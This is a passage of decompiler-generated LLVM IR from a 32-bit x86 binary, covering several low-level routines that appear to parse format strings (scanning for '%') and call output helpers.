  %v0_804bffa = phi i32 [ %storemerge1, %dec_label_pc_804c003 ], [ %storemerge12, %dec_label_pc_804bff2.preheader ]
  %v1_804bff2 = inttoptr i32 %v0_804bffa to i8*
  %v2_804bff2 = load i8, i8* %v1_804bff2, align 1
  %v3_804bff2 = and i8 %v2_804bff2, 64
  %v4_804bff2 = icmp eq i8 %v3_804bff2, 0
  br i1 %v4_804bff2, label %dec_label_pc_804c003, label %dec_label_pc_804bff7

dec_label_pc_804bff7:                             ; preds = %dec_label_pc_804bff2
  %v1_804bffb = call i32 @function_804c010(i32 %v0_804bffa)
  store i32 %v1_804bffb, i32* %eax.global-to-local, align 4
  %v0_804c003.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804c003

dec_label_pc_804c003:                             ; preds = %dec_label_pc_804bff2, %dec_label_pc_804bff7
  %v0_804c003 = phi i32 [ %v0_804bffa, %dec_label_pc_804bff2 ], [ %v0_804c003.pre, %dec_label_pc_804bff7 ]
  %v1_804c003 = add i32 %v0_804c003, 32
  %v2_804c003 = inttoptr i32 %v1_804c003 to i32*
  %storemerge1 = load i32, i32* %v2_804c003, align 4
  store i32 %storemerge1, i32* @ebx, align 4
  %v1_804c006 = icmp eq i32 %storemerge1, 0
  %v1_804c008 = icmp eq i1 %v1_804c006, false
  br i1 %v1_804c008, label %dec_label_pc_804bff2, label %dec_label_pc_804c00a

dec_label_pc_804c00a:                             ; preds = %dec_label_pc_804c003, %dec_label_pc_804c006.preheader
  %v2_804c00a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804c00a, i32* %eax.global-to-local, align 4
  %v2_804c00b = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804c00b, i32* @ebx, align 4
  store i32 %v0_804bf86, i32* @esi, align 4
  ret i32 %v2_804c00a

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32* %ebx.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 (i32)* @function_804bf6f, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_804c003, { 1, 0 }
  uselistorder label %dec_label_pc_804bff2, { 1, 0 }
  uselistorder label %dec_label_pc_804bfd0, { 1, 0 }
  uselistorder label %dec_label_pc_804bfa9, { 1, 0 }
}

define i32 @function_804c010(i32 %arg1) local_unnamed_addr {
dec_label_pc_804c010:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_804c010 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804c018 = add i32 %arg1, 8
  %v2_804c018 = inttoptr i32 %v1_804c018 to i32*
  %v3_804c018 = load i32, i32* %v2_804c018, align 4
  store i32 %v3_804c018, i32* %edx.global-to-local, align 4
  %v1_804c01b = add i32 %arg1, 16
  %v2_804c01b = inttoptr i32 %v1_804c01b to i32*
  %v3_804c01b = load i32, i32* %v2_804c01b, align 4
  %v2_804c01e = sub i32 %v3_804c01b, %v3_804c018
  %v12_804c01e = icmp eq i32 %v2_804c01e, 0
  store i32 %v2_804c01e, i32* %eax.global-to-local, align 4
  br i1 %v12_804c01e, label %dec_label_pc_804c031, label %dec_label_pc_804c022

dec_label_pc_804c022:                             ; preds = %dec_label_pc_804c010
  store i32 %v3_804c018, i32* %v2_804c01b, align 4
  %v0_804c025 = load i32, i32* @ecx, align 4
  %v0_804c026 = load i32, i32* %eax.global-to-local, align 4
  %v0_804c027 = load i32, i32* %edx.global-to-local, align 4
  %v0_804c028 = load i32, i32* @ebx, align 4
  %v4_804c029 = inttoptr i32 %v0_804c028 to i16*
  %v5_804c029 = call i32 @function_804f954(i16* %v4_804c029, i32 %v0_804c027, i32 %v0_804c026, i32 %v0_804c025)
  store i32 %v5_804c029, i32* %eax.global-to-local, align 4
  %v0_804c031.pre = load i32, i32* @ebx, align 4
  %v2_804c037.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804c031

dec_label_pc_804c031:                             ; preds = %dec_label_pc_804c010, %dec_label_pc_804c022
  %v2_804c037 = phi i32 [ %tmp11, %dec_label_pc_804c010 ], [ %v2_804c037.pre, %dec_label_pc_804c022 ]
  %v0_804c031 = phi i32 [ %arg1, %dec_label_pc_804c010 ], [ %v0_804c031.pre, %dec_label_pc_804c022 ]
  %v1_804c031 = add i32 %v0_804c031, 16
  %v2_804c031 = inttoptr i32 %v1_804c031 to i32*
  %v3_804c031 = load i32, i32* %v2_804c031, align 4
  store i32 %v3_804c031, i32* %eax.global-to-local, align 4
  %v2_804c034 = add i32 %v0_804c031, 8
  %v3_804c034 = inttoptr i32 %v2_804c034 to i32*
  %v4_804c034 = load i32, i32* %v3_804c034, align 4
  %v5_804c034 = sub i32 %v3_804c031, %v4_804c034
  store i32 %v5_804c034, i32* %eax.global-to-local, align 4
  store i32 %v2_804c037, i32* @edx, align 4
  store i32 %v0_804c010, i32* @ebx, align 4
  ret i32 %v5_804c034

; uselistorder directives
  uselistorder i32 %v0_804c031, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804c031, { 1, 0 }
}

define i32 @function_804c03c() local_unnamed_addr {
dec_label_pc_804c03c:
  %stack_var_-13 = alloca i32, align 4
  %v0_804c03c = load i32, i32* @edi, align 4
  %v0_804c03d = load i32, i32* @eax, align 4
  store i32 %v0_804c03d, i32* @edi, align 4
  %v0_804c03f = load i32, i32* @esi, align 4
  %v0_804c040 = load i32, i32* @ecx, align 4
  store i32 %v0_804c040, i32* @esi, align 4
  %v0_804c042 = load i32, i32* @ebx, align 4
  store i32 %v0_804c040, i32* @ebx, align 4
  %v0_804c048 = load i32, i32* @edx, align 4
  store i32 %v0_804c048, i32* %stack_var_-13, align 4
  %v1_804c04f2 = icmp eq i32 %v0_804c040, 0
  br i1 %v1_804c04f2, label %dec_label_pc_804c067, label %dec_label_pc_804c053.lr.ph

dec_label_pc_804c053.lr.ph:                       ; preds = %dec_label_pc_804c03c
  %v2_804c053 = ptrtoint i32* %stack_var_-13 to i32
  br label %dec_label_pc_804c053

dec_label_pc_804c04e:                             ; preds = %dec_label_pc_804c053
  %v1_804c04e = add i32 %v0_804c04e, -1
  %v8_804c04e = icmp eq i32 %v1_804c04e, 0
  store i32 %v1_804c04e, i32* @ebx, align 4
  br i1 %v8_804c04e, label %dec_label_pc_804c067.loopexit, label %dec_label_pc_804c04e.dec_label_pc_804c053_crit_edge

dec_label_pc_804c04e.dec_label_pc_804c053_crit_edge: ; preds = %dec_label_pc_804c04e
  %v0_804c057.pre = load i32, i32* @edx, align 4
  %v0_804c058.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804c053

dec_label_pc_804c053:                             ; preds = %dec_label_pc_804c04e.dec_label_pc_804c053_crit_edge, %dec_label_pc_804c053.lr.ph
  %v0_804c058 = phi i32 [ %v0_804c058.pre, %dec_label_pc_804c04e.dec_label_pc_804c053_crit_edge ], [ %v0_804c03d, %dec_label_pc_804c053.lr.ph ]
  %v0_804c057 = phi i32 [ %v0_804c057.pre, %dec_label_pc_804c04e.dec_label_pc_804c053_crit_edge ], [ %v0_804c048, %dec_label_pc_804c053.lr.ph ]
  %v4_804c05c = call i32 @function_804f9d4(i32 %v2_804c053, i32 1, i32 %v0_804c058, i32 %v0_804c057)
  %v8_804c064 = icmp eq i32 %v4_804c05c, 1
  %v0_804c04e = load i32, i32* @ebx, align 4
  br i1 %v8_804c064, label %dec_label_pc_804c04e, label %dec_label_pc_804c067.loopexit

dec_label_pc_804c067.loopexit:                    ; preds = %dec_label_pc_804c04e, %dec_label_pc_804c053
  %v1_804c06a.ph = phi i32 [ %v0_804c04e, %dec_label_pc_804c053 ], [ 0, %dec_label_pc_804c04e ]
  %v0_804c06a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c067

dec_label_pc_804c067:                             ; preds = %dec_label_pc_804c067.loopexit, %dec_label_pc_804c03c
  %v0_804c06a = phi i32 [ 0, %dec_label_pc_804c03c ], [ %v0_804c06a.pre, %dec_label_pc_804c067.loopexit ]
  %v1_804c06a = phi i32 [ 0, %dec_label_pc_804c03c ], [ %v1_804c06a.ph, %dec_label_pc_804c067.loopexit ]
  %v2_804c06a = sub i32 %v0_804c06a, %v1_804c06a
  store i32 %v0_804c042, i32* @ebx, align 4
  store i32 %v0_804c03f, i32* @esi, align 4
  store i32 %v0_804c03c, i32* @edi, align 4
  ret i32 %v2_804c06a

; uselistorder directives
  uselistorder i32 %v1_804c04e, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_804c067.loopexit, { 1, 0 }
}

define i32 @function_804c072(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804c072:
  store i32 0, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_804c085 = trunc i32 %arg2 to i8
  %v5_804c085 = icmp slt i8 %v3_804c085, 0
  %v1_804c087 = icmp eq i1 %v5_804c085, false
  br i1 %v1_804c087, label %dec_label_pc_804c0b8, label %dec_label_pc_804c089

dec_label_pc_804c089:                             ; preds = %dec_label_pc_804c072
  %v1_804c090 = inttoptr i32 %arg4 to i8*
  %v2_804c090 = call i32 @function_804d204(i8* %v1_804c090)
  %v0_804c098 = load i32, i32* @ebx, align 4
  %v2_804c098 = sub i32 %v0_804c098, %v2_804c090
  store i32 %v2_804c098, i32* @ebx, align 4
  store i32 %v2_804c090, i32* @esi, align 4
  %tmp18 = icmp slt i32 %v2_804c098, 1
  br i1 %tmp18, label %dec_label_pc_804c0b6, label %dec_label_pc_804c0a0

dec_label_pc_804c0a0:                             ; preds = %dec_label_pc_804c089
  store i32 %arg1, i32* @eax, align 4
  %v0_804c0a4 = load i32, i32* @edi, align 4
  %v1_804c0a4 = urem i32 %v0_804c0a4, 128
  store i32 %v1_804c0a4, i32* @edi, align 4
  store i32 %v2_804c098, i32* @ecx, align 4
  store i32 %v1_804c0a4, i32* @edx, align 4
  %v0_804c0ab = call i32 @function_804c03c()
  %v12_804c0b0 = icmp eq i32 %v0_804c0ab, %v2_804c098
  store i32 %v0_804c0ab, i32* @ebp, align 4
  %v1_804c0b4 = icmp eq i1 %v12_804c0b0, false
  br i1 %v1_804c0b4, label %dec_label_pc_804c0d2, label %dec_label_pc_804c0a0.dec_label_pc_804c0b6_crit_edge

dec_label_pc_804c0a0.dec_label_pc_804c0b6_crit_edge: ; preds = %dec_label_pc_804c0a0
  %v0_804c0b6.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c0b6

dec_label_pc_804c0b6:                             ; preds = %dec_label_pc_804c0a0.dec_label_pc_804c0b6_crit_edge, %dec_label_pc_804c089
  %v0_804c0b6 = phi i32 [ %v0_804c0b6.pre, %dec_label_pc_804c0a0.dec_label_pc_804c0b6_crit_edge ], [ %v2_804c090, %dec_label_pc_804c089 ]
  store i32 %v0_804c0b6, i32* @ebx, align 4
  br label %dec_label_pc_804c0b8

dec_label_pc_804c0b8:                             ; preds = %dec_label_pc_804c072, %dec_label_pc_804c0b6
  %v0_804c0c3 = phi i32 [ %arg3, %dec_label_pc_804c072 ], [ %v0_804c0b6, %dec_label_pc_804c0b6 ]
  %tmp19 = icmp slt i32 %v0_804c0c3, 1
  br i1 %tmp19, label %dec_label_pc_804c0d0, label %dec_label_pc_804c0be

dec_label_pc_804c0be:                             ; preds = %dec_label_pc_804c0b8
  %v0_804c0be = load i32, i32* @ecx, align 4
  %v4_804c0c8 = call i32 @function_804f9d4(i32 %arg4, i32 %v0_804c0c3, i32 %arg1, i32 %v0_804c0be)
  br label %dec_label_pc_804c0d0

dec_label_pc_804c0d0:                             ; preds = %dec_label_pc_804c0b8, %dec_label_pc_804c0be
  %v1_804c0d0 = phi i32 [ 0, %dec_label_pc_804c0b8 ], [ %v4_804c0c8, %dec_label_pc_804c0be ]
  %v0_804c0d0 = load i32, i32* @ebp, align 4
  %v2_804c0d0 = add i32 %v0_804c0d0, %v1_804c0d0
  br label %dec_label_pc_804c0d2

dec_label_pc_804c0d2:                             ; preds = %dec_label_pc_804c0a0, %dec_label_pc_804c0d0
  %v0_804c0d5 = phi i32 [ %v0_804c0ab, %dec_label_pc_804c0a0 ], [ %v2_804c0d0, %dec_label_pc_804c0d0 ]
  ret i32 %v0_804c0d5

; uselistorder directives
  uselistorder i32 %v0_804c0c3, { 1, 0 }
  uselistorder i32 %v0_804c0ab, { 1, 2, 0 }
  uselistorder i32 %v1_804c0a4, { 1, 0 }
  uselistorder i32 %v2_804c098, { 0, 2, 1, 3 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804c0d2, { 1, 0 }
  uselistorder label %dec_label_pc_804c0d0, { 1, 0 }
  uselistorder label %dec_label_pc_804c0b8, { 1, 0 }
}

define i32 @function_804c0dc(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804c0dc:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %sf.global-to-local = alloca i1, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804c0df = load i32, i32* @ebx, align 4
  store i32 %v0_804c0df, i32* %stack_var_-16, align 4
  %v4_804c0df = ptrtoint i32* %stack_var_-16 to i32
  %v1_804c0e0 = add i32 %v4_804c0df, -356
  %v10_804c0e0 = icmp slt i32 %v1_804c0e0, 0
  store i1 %v10_804c0e0, i1* %sf.global-to-local, align 1
  %v4_804c0e6 = ptrtoint i8* %arg2 to i32
  store i32 %v4_804c0e6, i32* @ebx, align 4
  %v2_804c0ee = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_804c0ee, i32* @esi, align 4
  %v4_804c0f3 = call i32 @function_804c694(i32* nonnull %stack_var_-348, i32 %v4_804c0e6)
  store i32 %v4_804c0f3, i32* %eax.global-to-local, align 4
  %v2_804c0fb = icmp slt i32 %v4_804c0f3, 0
  store i1 %v2_804c0fb, i1* %sf.global-to-local, align 1
  %v1_804c0fd = icmp eq i1 %v2_804c0fb, false
  br i1 %v1_804c0fd, label %dec_label_pc_804c13d, label %dec_label_pc_804c0ff

dec_label_pc_804c0ff:                             ; preds = %dec_label_pc_804c0dc
  %v12_804c0f8 = ptrtoint i32* %stack_var_-364 to i32
  %v3_804c0ff = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_804c0ff, i32* @ebx, align 4
  %v1_804c103 = add i32 %v12_804c0f8, -12
  %v10_804c103 = icmp slt i32 %v1_804c103, 0
  store i1 %v10_804c103, i1* %sf.global-to-local, align 1
  %v1_804c107 = inttoptr i32 %v3_804c0ff to i8*
  %v2_804c107 = call i32 @function_804d204(i8* %v1_804c107)
  store i32 %v2_804c107, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v1_804c116 = icmp eq i32 %v2_804c107, 0
  %v2_804c116 = icmp slt i32 %v2_804c107, 0
  store i1 %v2_804c116, i1* %sf.global-to-local, align 1
  br i1 %v1_804c116, label %dec_label_pc_804c686, label %dec_label_pc_804c11e

dec_label_pc_804c11e:                             ; preds = %dec_label_pc_804c0ff
  %v0_804c11e = load i32, i32* @edx, align 4
  %v0_804c127 = load i32, i32* @ebx, align 4
  %v5_804c128 = call i32 @function_804f9d4(i32 %v0_804c127, i32 %v2_804c107, i32 %arg1, i32 %v0_804c11e)
  store i32 %v5_804c128, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v0_804c135 = load i32, i32* @esp, align 4
  %v1_804c135 = add i32 %v0_804c135, 16
  %v7_804c135 = icmp slt i32 %v1_804c135, 0
  store i1 %v7_804c135, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804c686

dec_label_pc_804c13d:                             ; preds = %dec_label_pc_804c0dc
  %v5_804c147 = call i32 @function_804c704(i32 %v2_804c0ee, i32 %arg3, i32 %v4_804c0f3, i32 %v4_804c0f3)
  store i32 %v5_804c147, i32* %eax.global-to-local, align 4
  %v0_804c14c = load i32, i32* @ebx, align 4
  store i32 %v0_804c14c, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_804c156 = load i32, i32* @esp, align 4
  %v1_804c156 = add i32 %v0_804c156, 16
  %v7_804c156 = icmp slt i32 %v1_804c156, 0
  store i1 %v7_804c156, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804c15c

dec_label_pc_804c15b:                             ; preds = %dec_label_pc_804c162
  %v1_804c15b = add i32 %v0_804c16a, 1
  %v9_804c15b = icmp slt i32 %v1_804c15b, 0
  store i1 %v9_804c15b, i1* %sf.global-to-local, align 1
  store i32 %v1_804c15b, i32* @ebx, align 4
  br label %dec_label_pc_804c15c.backedge

dec_label_pc_804c15c.backedge:                    ; preds = %dec_label_pc_804c15b, %dec_label_pc_804c66c, %dec_label_pc_804c677
  %v1_804c16620 = phi i32 [ %v1_804c16e, %dec_label_pc_804c15b ], [ %v3_804c66c, %dec_label_pc_804c66c ], [ %v1_804c19a, %dec_label_pc_804c677 ]
  %v0_804c15c18 = phi i32 [ %v1_804c15b, %dec_label_pc_804c15b ], [ %v3_804c66c, %dec_label_pc_804c66c ], [ %v1_804c677, %dec_label_pc_804c677 ]
  %v4_804c15c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c15c

dec_label_pc_804c15c:                             ; preds = %dec_label_pc_804c15c.backedge, %dec_label_pc_804c13d
  %v1_804c16e = phi i32 [ %v1_804c16620, %dec_label_pc_804c15c.backedge ], [ %v0_804c14c, %dec_label_pc_804c13d ]
  %v0_804c16a = phi i32 [ %v0_804c15c18, %dec_label_pc_804c15c.backedge ], [ %v0_804c14c, %dec_label_pc_804c13d ]
  %v4_804c15c = phi i32 [ %v4_804c15c.pre, %dec_label_pc_804c15c.backedge ], [ %v5_804c147, %dec_label_pc_804c13d ]
  %v1_804c15c = inttoptr i32 %v0_804c16a to i8*
  %v2_804c15c = load i8, i8* %v1_804c15c, align 1
  %v3_804c15c = zext i8 %v2_804c15c to i32
  %v5_804c15c = and i32 %v4_804c15c, -256
  %v6_804c15c = or i32 %v3_804c15c, %v5_804c15c
  store i32 %v6_804c15c, i32* %eax.global-to-local, align 4
  %v4_804c15e = icmp eq i8 %v2_804c15c, 0
  %v5_804c15e = icmp slt i8 %v2_804c15c, 0
  store i1 %v5_804c15e, i1* %sf.global-to-local, align 1
  br i1 %v4_804c15e, label %dec_label_pc_804c166, label %dec_label_pc_804c162

dec_label_pc_804c162:                             ; preds = %dec_label_pc_804c15c
  %v2_804c162 = add i8 %v2_804c15c, -37
  %v10_804c162 = icmp eq i8 %v2_804c162, 0
  %v11_804c162 = icmp slt i8 %v2_804c162, 0
  store i1 %v11_804c162, i1* %sf.global-to-local, align 1
  %v1_804c164 = icmp eq i1 %v10_804c162, false
  br i1 %v1_804c164, label %dec_label_pc_804c15b, label %dec_label_pc_804c166

dec_label_pc_804c166:                             ; preds = %dec_label_pc_804c162, %dec_label_pc_804c15c
  %v2_804c166 = sub i32 %v0_804c16a, %v1_804c16e
  %v12_804c166 = icmp eq i32 %v2_804c166, 0
  %v13_804c166 = icmp slt i32 %v2_804c166, 0
  store i1 %v13_804c166, i1* %sf.global-to-local, align 1
  br i1 %v12_804c166, label %dec_label_pc_804c191, label %dec_label_pc_804c16a

dec_label_pc_804c16a:                             ; preds = %dec_label_pc_804c166
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804c166, i32* @esi, align 4
  store i1 %v13_804c166, i1* %sf.global-to-local, align 1
  %tmp64 = icmp slt i32 %v2_804c166, 1
  br i1 %tmp64, label %dec_label_pc_804c186, label %dec_label_pc_804c174

dec_label_pc_804c174:                             ; preds = %dec_label_pc_804c16a
  %v0_804c174 = load i32, i32* @ebp, align 4
  %v1_804c174 = load i32, i32* @esp, align 4
  %v2_804c174 = add i32 %v1_804c174, -4
  %v3_804c174 = inttoptr i32 %v2_804c174 to i32*
  store i32 %v0_804c174, i32* %v3_804c174, align 4
  %v1_804c175 = add i32 %v1_804c174, 368
  %v2_804c175 = inttoptr i32 %v1_804c175 to i32*
  %v3_804c175 = load i32, i32* %v2_804c175, align 4
  %v5_804c175 = add i32 %v1_804c174, -8
  %v6_804c175 = inttoptr i32 %v5_804c175 to i32*
  store i32 %v3_804c175, i32* %v6_804c175, align 4
  %v0_804c17c = load i32, i32* @esi, align 4
  %v2_804c17c = add i32 %v1_804c174, -12
  %v3_804c17c = inttoptr i32 %v2_804c17c to i32*
  store i32 %v0_804c17c, i32* %v3_804c17c, align 4
  %v0_804c17d = load i32, i32* %edx.global-to-local, align 4
  %v2_804c17d = add i32 %v1_804c174, -16
  %v3_804c17d = inttoptr i32 %v2_804c17d to i32*
  store i32 %v0_804c17d, i32* %v3_804c17d, align 4
  %v0_804c17e = load i32, i32* %stack_var_-364, align 4
  %v4_804c17e = call i32 @function_804f9d4(i32 %v0_804c17e, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804c17e, i32* %eax.global-to-local, align 4
  %v0_804c183 = load i32, i32* @esp, align 4
  %v1_804c183 = add i32 %v0_804c183, 16
  %v7_804c183 = icmp slt i32 %v1_804c183, 0
  store i1 %v7_804c183, i1* %sf.global-to-local, align 1
  %v1_804c186.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c186

dec_label_pc_804c186:                             ; preds = %dec_label_pc_804c16a, %dec_label_pc_804c174
  %v3_804c18e = phi i32 [ %v2_804c166, %dec_label_pc_804c16a ], [ %v1_804c186.pre, %dec_label_pc_804c174 ]
  %v0_804c186 = phi i32 [ 0, %dec_label_pc_804c16a ], [ %v4_804c17e, %dec_label_pc_804c174 ]
  %v2_804c186 = sub i32 %v0_804c186, %v3_804c18e
  %v12_804c186 = icmp eq i32 %v2_804c186, 0
  %v13_804c186 = icmp slt i32 %v2_804c186, 0
  store i1 %v13_804c186, i1* %sf.global-to-local, align 1
  %v1_804c188 = icmp eq i1 %v12_804c186, false
  %v0_804c67f.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_804c188, label %dec_label_pc_804c67f, label %dec_label_pc_804c18e

dec_label_pc_804c18e:                             ; preds = %dec_label_pc_804c186
  %v1_804c18e = inttoptr i32 %v0_804c67f.pre.pre to i32*
  %v2_804c18e = load i32, i32* %v1_804c18e, align 4
  %v4_804c18e = add i32 %v2_804c18e, %v3_804c18e
  %v15_804c18e = icmp slt i32 %v4_804c18e, 0
  store i1 %v15_804c18e, i1* %sf.global-to-local, align 1
  store i32 %v4_804c18e, i32* %v1_804c18e, align 4
  %v0_804c191.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804c191

dec_label_pc_804c191:                             ; preds = %dec_label_pc_804c166, %dec_label_pc_804c18e
  %v0_804c677 = phi i32 [ %v0_804c16a, %dec_label_pc_804c166 ], [ %v0_804c191.pre, %dec_label_pc_804c18e ]
  %v1_804c191 = inttoptr i32 %v0_804c677 to i8*
  %v2_804c191 = load i8, i8* %v1_804c191, align 1
  %v3_804c191 = icmp eq i8 %v2_804c191, 0
  %v4_804c191 = icmp slt i8 %v2_804c191, 0
  store i1 %v4_804c191, i1* %sf.global-to-local, align 1
  br i1 %v3_804c191, label %dec_label_pc_804c686, label %dec_label_pc_804c19a

dec_label_pc_804c19a:                             ; preds = %dec_label_pc_804c191
  %v1_804c19a = add i32 %v0_804c677, 1
  %v2_804c19a = inttoptr i32 %v1_804c19a to i8*
  %v3_804c19a = load i8, i8* %v2_804c19a, align 1
  %v4_804c19a = add i8 %v3_804c19a, -37
  %v12_804c19a = icmp eq i8 %v4_804c19a, 0
  %v13_804c19a = icmp slt i8 %v4_804c19a, 0
  store i1 %v13_804c19a, i1* %sf.global-to-local, align 1
  store i32 %v1_804c19a, i32* %edx.global-to-local, align 4
  br i1 %v12_804c19a, label %dec_label_pc_804c677, label %dec_label_pc_804c1a7

dec_label_pc_804c1a7:                             ; preds = %dec_label_pc_804c19a
  %v1_804c1a7 = load i32, i32* @esp, align 4
  %v2_804c1a7 = add i32 %v1_804c1a7, 16
  %v3_804c1a7 = inttoptr i32 %v2_804c1a7 to i32*
  store i32 %v1_804c19a, i32* %v3_804c1a7, align 4
  %v0_804c1ab = load i32, i32* @esp, align 4
  %v1_804c1ab = add i32 %v0_804c1ab, 340
  %v2_804c1ab = inttoptr i32 %v1_804c1ab to i32*
  store i32 0, i32* %v2_804c1ab, align 4
  %v0_804c1b6 = load i32, i32* @esp, align 4
  %v1_804c1b6 = add i32 %v0_804c1b6, -12
  %v10_804c1b6 = icmp slt i32 %v1_804c1b6, 0
  store i1 %v10_804c1b6, i1* %sf.global-to-local, align 1
  %v1_804c1b9 = add i32 %v0_804c1b6, 16
  store i32 %v1_804c1b9, i32* @ebx, align 4
  %v2_804c1bd = add i32 %v0_804c1b6, -16
  %v3_804c1bd = inttoptr i32 %v2_804c1bd to i32*
  store i32 %v1_804c1b9, i32* %v3_804c1bd, align 4
  %v0_804c1be = load i32, i32* %stack_var_-364, align 4
  %v1_804c1be = inttoptr i32 %v0_804c1be to i32*
  %v2_804c1be = call i32 @function_804c885(i32* %v1_804c1be)
  store i32 %v2_804c1be, i32* %eax.global-to-local, align 4
  %v0_804c1c3 = load i32, i32* @ebx, align 4
  %v1_804c1c3 = load i32, i32* @esp, align 4
  %v2_804c1c3 = inttoptr i32 %v1_804c1c3 to i32*
  store i32 %v0_804c1c3, i32* %v2_804c1c3, align 4
  %v0_804c1c6 = load i32, i32* %stack_var_-364, align 4
  %v1_804c1c6 = call i32 @function_804c748(i32 %v0_804c1c6)
  store i32 %v1_804c1c6, i32* %eax.global-to-local, align 4
  %v0_804c1cb = load i32, i32* @esp, align 4
  %v1_804c1cb = add i32 %v0_804c1cb, 70
  %v2_804c1cb = inttoptr i32 %v1_804c1cb to i8*
  %v3_804c1cb = load i8, i8* %v2_804c1cb, align 1
  %v4_804c1cb = zext i8 %v3_804c1cb to i32
  store i32 %v4_804c1cb, i32* @edi, align 4
  %v1_804c1d0 = add i32 %v0_804c1cb, 16
  %v1_804c1d3 = add i32 %v0_804c1cb, 56
  %v2_804c1d3 = inttoptr i32 %v1_804c1d3 to i32*
  %v3_804c1d3 = load i32, i32* %v2_804c1d3, align 4
  %v5_804c1d3 = icmp slt i32 %v3_804c1d3, 0
  store i1 %v5_804c1d3, i1* %sf.global-to-local, align 1
  %v1_804c1d8 = add i32 %v0_804c1cb, 112
  store i32 %v1_804c1d8, i32* %edx.global-to-local, align 4
  %tmp65 = icmp slt i32 %v3_804c1d3, 1
  br i1 %tmp65, label %dec_label_pc_804c1e5, label %dec_label_pc_804c1de

dec_label_pc_804c1de:                             ; preds = %dec_label_pc_804c1a7
  %v2_804c1de = zext i8 %v3_804c1cb to i32
  %v3_804c1de = mul nuw nsw i32 %v2_804c1de, 12
  store i32 %v3_804c1de, i32* %eax.global-to-local, align 4
  %v2_804c1e1 = add i32 %v0_804c1cb, 100
  %v3_804c1e1 = add i32 %v2_804c1e1, %v3_804c1de
  store i32 %v3_804c1e1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804c1e5

dec_label_pc_804c1e5:                             ; preds = %dec_label_pc_804c1a7, %dec_label_pc_804c1de
  %v0_804c1ed27 = phi i32 [ %v1_804c1d8, %dec_label_pc_804c1a7 ], [ %v3_804c1e1, %dec_label_pc_804c1de ]
  %v1_804c1e5 = add i32 %v0_804c1cb, 60
  %v2_804c1e5 = inttoptr i32 %v1_804c1e5 to i32*
  %v3_804c1e5 = load i32, i32* %v2_804c1e5, align 4
  store i32 %v3_804c1e5, i32* %ecx.global-to-local, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804c1f871 = sub i32 0, %v3_804c1e5
  %v10_804c1f874 = and i32 %v3_804c1e5, %v2_804c1f871
  %v11_804c1f875 = icmp slt i32 %v10_804c1f874, 0
  %v13_804c1f876 = icmp slt i32 %v2_804c1f871, 0
  %v2_804c1fa77 = icmp eq i1 %v13_804c1f876, %v11_804c1f875
  br i1 %v2_804c1fa77, label %dec_label_pc_804c1fc, label %dec_label_pc_804c1ed

dec_label_pc_804c1ed:                             ; preds = %dec_label_pc_804c1e5, %dec_label_pc_804c1ed
  %v0_804c1fc81 = phi i32 [ %v0_804c1fc, %dec_label_pc_804c1ed ], [ %v1_804c1d0, %dec_label_pc_804c1e5 ]
  %v2_804c1ed80 = phi i32 [ %v1_804c1f7, %dec_label_pc_804c1ed ], [ 0, %dec_label_pc_804c1e5 ]
  %v0_804c1ed79 = phi i32 [ %v1_804c1f4, %dec_label_pc_804c1ed ], [ %v0_804c1ed27, %dec_label_pc_804c1e5 ]
  %v3_804c1ed = mul i32 %v2_804c1ed80, 4
  %v4_804c1ed = add i32 %v3_804c1ed, 344
  %v5_804c1ed = add i32 %v4_804c1ed, %v0_804c1fc81
  %v6_804c1ed = inttoptr i32 %v5_804c1ed to i32*
  store i32 %v0_804c1ed79, i32* %v6_804c1ed, align 4
  %v0_804c1f4 = load i32, i32* %edx.global-to-local, align 4
